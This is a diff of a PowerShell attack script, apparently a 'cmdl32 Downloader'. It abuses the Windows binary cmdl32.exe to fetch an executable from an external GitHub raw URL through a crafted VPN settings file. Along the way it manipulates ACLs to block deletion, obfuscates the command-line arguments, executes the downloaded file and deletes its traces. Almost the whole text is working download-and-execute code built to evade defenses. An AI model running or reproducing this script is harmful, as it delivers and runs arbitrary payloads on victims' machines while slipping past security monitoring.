@@ -1,72 +1,55 @@
 Write-Host "[-] cmdl32 Downloader - liquidsky ^_~"
 # Thanks to Elliot Killick (@elliotkillick) for the discovery of the lolbin
-
 # Create a temp directory to work in
 $tempDir = Join-Path -Path $env:TEMP -ChildPath "cmdl32_temp"
 New-Item -Path $tempDir -ItemType Directory -Force
-Write-Host "[*] Temporary directory created at $tempDir"
-
-# Copy cmdl32.exe to the temporary directory with a new name
-$cmdl32Source = "C:\Windows\System32\cmdl32.exe"
-$newCmdl32Name = "updater.exe"
-$newCmdl32Path = Join-Path -Path $tempDir -ChildPath $newCmdl32Name
-Write-Host "[*] Copying cmdl32.exe to $tempDir as $newCmdl32Name"
-try {
-    Copy-Item -Path $cmdl32Source -Destination $newCmdl32Path -Force
-    Write-Host "[*] cmdl32.exe copied and renamed to $newCmdl32Name."
-} catch {
-    Write-Host "[!] Failed to copy and rename cmdl32.exe: $($_.Exception.Message)"
-    Exit
-}
-
 # Change to the temp directory
 Set-Location -Path $tempDir
 Write-Host "[*] Working directory changed to $tempDir"
-
-# Deny delete permissions in the temp directory for the current user
 Write-Host "[*] Denying delete permissions for current user"
+# Deny delete permissions in the temp directory for the current user
 icacls $tempDir /deny "$($env:USERNAME):(OI)(CI)(DE,DC)"
-
-# Set the TMP environment variable to the temp directory
 Write-Host "[*] Setting temp environment variable"
+# Set the TMP environment variable to the temp directory
 $env:TMP = $tempDir
-
-# Create the VPN settings file
 Write-Host "[*] Creating VPN settings file"
 $settingsContent = @"
 [Connection Manager]
-CMSFile=Thumbs.db
+CMSFile=settings.txt
 ServiceName=WindowsUpdate
-TunnelFile=Thumbs.db
+TunnelFile=settings.txt
 [Settings]
 UpdateUrl=https://raw.githubusercontent.com/fuzzlove/h4v0k/main/whois.exe
 "@
-Set-Content -Path "$tempDir\Thumbs.db" -Value $settingsContent
+Set-Content -Path "$tempDir\settings.txt" -Value $settingsContent
+Write-Host "[*] Performing download with cmdl32"
+# Assuming cmdl32 is in system32 or accessible
+$cmdl32Path = "cmdl32"
+$arguments = '/v"p"n /l"a"n "' + "$tempDir\settings.txt" + '"'
 
-# Use the renamed updater.exe for downloading
-Write-Host "[*] Performing download with $newCmdl32Name"
-$arguments = "/vpn /ᴸan `"$tempDir\Thumbs.db`""
 try {
-    Start-Process -FilePath $newCmdl32Path -ArgumentList $arguments -NoNewWindow -Wait
-    Write-Host "[*] Download complete with $newCmdl32Name."
+    Start-Process -FilePath $cmdl32Path -ArgumentList $arguments -NoNewWindow -Wait
+    Write-Host "[*] Download complete with cmdl32."
 } catch {
-    Write-Host "[!] $newCmdl32Name download failed: $($_.Exception.Message)"
+    Write-Host "[!] cmdl32 failed: $($_.Exception.Message)"
     # Revert permissions before exiting
     icacls $tempDir /remove:d "$env:USERNAME"
     Exit
 }
-
-# Revert permissions
 Write-Host "[*] Reverting permissions"
 icacls $tempDir /remove:d "$env:USERNAME"
-
-# Rename downloaded file for execution
 Write-Host "[*] Renaming downloaded file for execution"
 $downloadedFile = Get-ChildItem -Path $tempDir -Filter "VPN*.tmp" | Select-Object -First 1
 if ($downloadedFile) {
     Write-Host "[*] Downloaded file found: $($downloadedFile.FullName)"
+    
+    # Construct the target path for the rename
     $targetPath = Join-Path -Path $tempDir -ChildPath "whois.exe"
+    
+    # Debug output: Check the target path
     Write-Host "[*] Target path: $targetPath"
+    
+    # Try renaming (or moving) the file using Move-Item
     try {
         Move-Item -Path $downloadedFile.FullName -Destination $targetPath -Force
         Write-Host "[*] Renamed (moved) VPN*.tmp to whois.exe."
@@ -78,8 +61,6 @@ if ($downloadedFile) {
     Write-Host "[!] No downloaded file found matching 'VPN*.tmp'. Exiting script."
     Exit
 }
-
-# Execute the downloaded file
 Write-Host "[*] Executing the downloaded file"
 if (Test-Path "$tempDir\whois.exe") {
     Start-Process -FilePath "$tempDir\whois.exe" -NoNewWindow -Wait
@@ -88,10 +69,7 @@ if (Test-Path "$tempDir\whois.exe") {
     Write-Host "[!] whois.exe not found after renaming. Exiting script."
     Exit
 }
-
-# Cleanup
-Write-Host "[*] Cleaning up downloaded file and temporary files"
+Write-Host "[*] Cleaning up downloaded file"
 Remove-Item -Path "$tempDir\whois.exe" -Force
-Remove-Item -Path "$tempDir\Thumbs.db" -Force
-Remove-Item -Path "$newCmdl32Path" -Force
+Remove-Item -Path "$tempDir\settings.txt" -Force
 Write-Host "[*] Script complete."
